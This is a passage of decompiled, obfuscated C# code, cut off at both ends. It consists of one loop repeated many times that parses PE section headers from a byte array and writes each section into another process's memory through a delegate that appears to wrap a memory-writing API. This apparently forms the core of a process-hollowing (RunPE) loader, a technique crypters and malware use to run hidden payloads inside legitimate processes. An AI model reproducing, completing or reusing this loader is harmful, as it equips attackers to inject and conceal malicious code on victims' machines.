						((byte*)ptr)[3695] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 384))), array31, array31.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3695] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3699] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3699] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 396)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 400)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 404)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3697] = ((*(int*)((byte*)ptr + 400) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3697] != 0)
					{
						byte[] array32;
						checked
						{
							array32 = new byte[*unchecked((int*)((byte*)ptr + 400)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 404), array32, 0, array32.Length);
						((byte*)ptr)[3698] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 396))), array32, array32.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3698] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3702] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3702] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 408)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 412)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 416)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3700] = ((*(int*)((byte*)ptr + 412) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3700] != 0)
					{
						byte[] array33;
						checked
						{
							array33 = new byte[*unchecked((int*)((byte*)ptr + 412)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 416), array33, 0, array33.Length);
						((byte*)ptr)[3701] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 408))), array33, array33.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3701] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3705] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3705] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 420)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 424)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 428)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3703] = ((*(int*)((byte*)ptr + 424) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3703] != 0)
					{
						byte[] array34;
						checked
						{
							array34 = new byte[*unchecked((int*)((byte*)ptr + 424)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 428), array34, 0, array34.Length);
						((byte*)ptr)[3704] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 420))), array34, array34.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3704] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3708] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3708] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 432)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 436)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 440)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3706] = ((*(int*)((byte*)ptr + 436) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3706] != 0)
					{
						byte[] array35;
						checked
						{
							array35 = new byte[*unchecked((int*)((byte*)ptr + 436)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 440), array35, 0, array35.Length);
						((byte*)ptr)[3707] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 432))), array35, array35.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3707] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3711] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3711] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 444)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 448)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 452)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3709] = ((*(int*)((byte*)ptr + 448) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3709] != 0)
					{
						byte[] array36;
						checked
						{
							array36 = new byte[*unchecked((int*)((byte*)ptr + 448)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 452), array36, 0, array36.Length);
						((byte*)ptr)[3710] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 444))), array36, array36.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3710] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3714] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3714] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 456)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 460)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 464)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3712] = ((*(int*)((byte*)ptr + 460) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3712] != 0)
					{
						byte[] array37;
						checked
						{
							array37 = new byte[*unchecked((int*)((byte*)ptr + 460)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 464), array37, 0, array37.Length);
						((byte*)ptr)[3713] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 456))), array37, array37.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3713] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3717] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3717] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 468)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 472)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 476)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3715] = ((*(int*)((byte*)ptr + 472) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3715] != 0)
					{
						byte[] array38;
						checked
						{
							array38 = new byte[*unchecked((int*)((byte*)ptr + 472)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 476), array38, 0, array38.Length);
						((byte*)ptr)[3716] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 468))), array38, array38.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3716] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3720] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3720] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 480)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 484)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 488)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3718] = ((*(int*)((byte*)ptr + 484) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3718] != 0)
					{
						byte[] array39;
						checked
						{
							array39 = new byte[*unchecked((int*)((byte*)ptr + 484)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 488), array39, 0, array39.Length);
						((byte*)ptr)[3719] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 480))), array39, array39.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3719] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3723] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3723] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 492)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 496)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 500)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3721] = ((*(int*)((byte*)ptr + 496) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3721] != 0)
					{
						byte[] array40;
						checked
						{
							array40 = new byte[*unchecked((int*)((byte*)ptr + 496)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 500), array40, 0, array40.Length);
						((byte*)ptr)[3722] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 492))), array40, array40.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3722] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3726] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3726] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 504)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 508)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 512)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3724] = ((*(int*)((byte*)ptr + 508) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3724] != 0)
					{
						byte[] array41;
						checked
						{
							array41 = new byte[*unchecked((int*)((byte*)ptr + 508)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 512), array41, 0, array41.Length);
						((byte*)ptr)[3725] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 504))), array41, array41.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3725] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3729] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3729] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 516)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 520)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 524)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3727] = ((*(int*)((byte*)ptr + 520) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3727] != 0)
					{
						byte[] array42;
						checked
						{
							array42 = new byte[*unchecked((int*)((byte*)ptr + 520)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 524), array42, 0, array42.Length);
						((byte*)ptr)[3728] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 516))), array42, array42.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3728] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3732] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3732] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 528)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 532)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 536)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3730] = ((*(int*)((byte*)ptr + 532) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3730] != 0)
					{
						byte[] array43;
						checked
						{
							array43 = new byte[*unchecked((int*)((byte*)ptr + 532)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 536), array43, 0, array43.Length);
						((byte*)ptr)[3731] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 528))), array43, array43.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3731] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3735] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3735] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 540)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 544)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 548)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3733] = ((*(int*)((byte*)ptr + 544) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3733] != 0)
					{
						byte[] array44;
						checked
						{
							array44 = new byte[*unchecked((int*)((byte*)ptr + 544)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 548), array44, 0, array44.Length);
						((byte*)ptr)[3734] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 540))), array44, array44.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3734] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3738] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3738] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 552)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 556)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 560)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3736] = ((*(int*)((byte*)ptr + 556) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3736] != 0)
					{
						byte[] array45;
						checked
						{
							array45 = new byte[*unchecked((int*)((byte*)ptr + 556)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 560), array45, 0, array45.Length);
						((byte*)ptr)[3737] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 552))), array45, array45.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3737] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3741] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3741] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 564)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 568)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 572)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3739] = ((*(int*)((byte*)ptr + 568) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3739] != 0)
					{
						byte[] array46;
						checked
						{
							array46 = new byte[*unchecked((int*)((byte*)ptr + 568)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 572), array46, 0, array46.Length);
						((byte*)ptr)[3740] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 564))), array46, array46.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3740] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3744] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3744] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 576)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 580)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 584)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3742] = ((*(int*)((byte*)ptr + 580) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3742] != 0)
					{
						byte[] array47;
						checked
						{
							array47 = new byte[*unchecked((int*)((byte*)ptr + 580)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 584), array47, 0, array47.Length);
						((byte*)ptr)[3743] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 576))), array47, array47.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3743] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3747] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3747] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 588)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 592)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 596)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3745] = ((*(int*)((byte*)ptr + 592) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3745] != 0)
					{
						byte[] array48;
						checked
						{
							array48 = new byte[*unchecked((int*)((byte*)ptr + 592)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 596), array48, 0, array48.Length);
						((byte*)ptr)[3746] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 588))), array48, array48.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3746] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3750] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3750] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 600)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 604)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 608)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3748] = ((*(int*)((byte*)ptr + 604) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3748] != 0)
					{
						byte[] array49;
						checked
						{
							array49 = new byte[*unchecked((int*)((byte*)ptr + 604)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 608), array49, 0, array49.Length);
						((byte*)ptr)[3749] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 600))), array49, array49.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3749] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3753] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3753] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 612)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 616)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 620)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3751] = ((*(int*)((byte*)ptr + 616) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3751] != 0)
					{
						byte[] array50;
						checked
						{
							array50 = new byte[*unchecked((int*)((byte*)ptr + 616)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 620), array50, 0, array50.Length);
						((byte*)ptr)[3752] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 612))), array50, array50.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3752] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
